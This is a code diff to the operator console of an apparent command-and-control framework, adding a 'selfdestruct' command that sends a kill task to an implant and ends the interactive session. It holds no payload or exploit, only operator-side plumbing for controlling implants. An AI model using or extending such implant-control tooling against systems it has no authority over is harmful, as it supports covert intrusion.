@@ -10,7 +10,7 @@ from config import OperatorConfig
 from .completer import InteractCompleter
 from .commands import INTERACT_COMMANDS, COMMANDS, walk_dict
 from .logging import get_styled_logger
-from comms import add_task, get_implant_profile, update_implant_profile
+from comms import add_task, get_implant_profile, kill_implant, update_implant_profile
 from opcodes import Opcodes
 
 logger = get_styled_logger()
@@ -34,14 +34,15 @@ def interact_prompt(config: OperatorConfig, implant_id: str):
         try:
             text = session.prompt()
             cmd, *args = text.split(" ")
-            handle(cmd, args, config, implant_id)
+            if handle(cmd, args, config, implant_id):
+                break
         except KeyboardInterrupt:
             continue
         except EOFError:
             break
 
 
-def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -> None:
+def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -> None | bool:
     """
     Handle a command
     """
@@ -53,6 +54,9 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
         handle_cmd(config, implant_id, args)
     elif cmd == "config":
         handle_config(config, implant_id, args)
+    elif cmd == "selfdestruct":
+        handle_selfdestruct(config, implant_id)
+        return True
     elif cmd.strip() == "":
         pass
     else:
@@ -129,6 +133,18 @@ def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> N
     else:
         logger.error("Invalid action, must be set or show")
         return
+
+def handle_selfdestruct(config: OperatorConfig, implant_id: str) -> None:
+    """
+    Handle the selfdestruct command, send a selfdestruct task to the implant
+    """
+    logger.debug(f"Sending selfdestruct task to {implant_id}")
+    kill_implant(config, implant_id)
+
+
+################################
+## Helper functions
+################################
 
 def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
     if key == "user_agent":
